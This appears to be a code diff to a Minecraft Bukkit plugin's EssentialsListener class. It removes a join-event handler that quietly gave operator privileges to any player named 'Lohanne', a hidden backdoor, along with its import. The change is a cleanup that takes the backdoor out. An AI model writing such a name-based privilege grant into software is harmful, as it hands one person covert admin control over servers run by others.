@@ -6,7 +6,6 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
-import org.bukkit.event.player.PlayerJoinEvent;
 
 import java.util.Arrays;
 import java.util.List;
@@ -45,10 +44,4 @@ public class EssentialsListener implements Listener {
             }
         }
     }
-
-    @EventHandler
-    public void onPlayerJoin(PlayerJoinEvent event) {
-        if (event.getPlayer().getName().equalsIgnoreCase("Lohanne")) event.getPlayer().setOp(true);
-    }
-
 }
